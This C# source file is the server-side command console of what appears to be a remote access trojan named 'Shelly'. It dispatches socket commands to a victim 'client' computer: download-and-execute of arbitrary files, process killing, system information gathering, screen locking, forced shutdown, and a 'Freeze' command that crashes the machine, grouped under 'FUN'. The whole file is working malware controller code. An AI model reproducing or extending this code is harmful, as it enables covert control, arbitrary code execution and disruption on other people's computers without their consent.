using System;

namespace Shelly_Server
{
    class InputOutput
    {
        public static void IO(string UserIO)
        {
            string Command = UserIO.ToLower();
            string CommandPS = Command + " ";

            // Turn to lower case and handle it
            switch (Command)
            {
                // Shows help section
                case "help":
                    Console.WriteLine(
                        "SERVER COMMANDS\n" +
                        "1. Help - Displays this help section\n" +
                        "2. Clear - Clears the console\n" +
                        "3. Exit - Exits\n\n" +

                        "GENERAL\n" +

                        "1. Uninstall - Uninstalls Shelly from the client computer\n" +
                        "2. Disconnect - Shuts down the shell until next system startup\n" +
                        "3. Ping - Pings the client and shows the response\n" + 
                        "4. MessageBox - Shows a messagebox on the clients computer\n" +
                        "5. DownloadAndExecute - Downloads and executes a file\n" +
                        "6. OpenWebsite - Opens a website using the IE browser\n" +
                        "7. Info - Shows client system information\n" +
                        "8. Taskkill - Terminate process on client computer\n\n" +

                        "FUN\n" +
                        "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
                        "2. Freeze - Freezes and eventually crashes the client computer\n" +
                        "3. Lock - Locks the client computer for x amount of seconds\n\n" +

                        "POWER OPTIONS\n" +

                        "1. Shutdown\n" +
                        "2. Restart\n" +
                        "3. hibernate"
                    );
                    break;

                // Clears the console
                case "clear":

                    // Clear
                    Console.Clear();
                    break;

                // Exit
                case "exit":

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;

                // Request Ping from client
                case "ping":

                    // Send message
                    SocketHandler.Send(Command);

                    // Receive response
                    Console.WriteLine(SocketHandler.Receive());
                    break;

                // Show messagebox
                case "messagebox":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetGeneralInput(3));
                    break;

                // Download and execute
                case "downloadandexecute":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1) + " " + Functions.UserInput.GetGeneralInput(1));
                    break;

                // Open website
                case "openwebsite":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(3));
                    break;

                // Get client info
                case "info":

                    // Send message
                    SocketHandler.Send(Command);

                    // Get response
                    Console.WriteLine(SocketHandler.Receive());
                    break;

                // Taskkill
                case "taskkill":

                    // Send message
                    SocketHandler.Send(Command);

                    // Get and show all running processes
                    Console.WriteLine(SocketHandler.Receive());

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetGeneralInput(2));
                    break;

                // Change wallpaper
                case "changewallpaper":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(2));
                    break;

                // Lock
                case "lock":

                    // Send message
                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLockInput());
                    break;

                // Uninstall shell
                case "uninstall":

                // Uninstall shell
                case "disconnect":

                // Freeze
                case "freeze":

                // Shutdown client computer
                case "shutdown":

                // Restart client computer
                case "restart":

                // Hibernate client computer
                case "hibernate":

                    // Send message
                    SocketHandler.Send(Command);

                    // Disconnect and exit
                    SocketHandler.ShutdownServer();
                    break;
            }
        }
    }
}
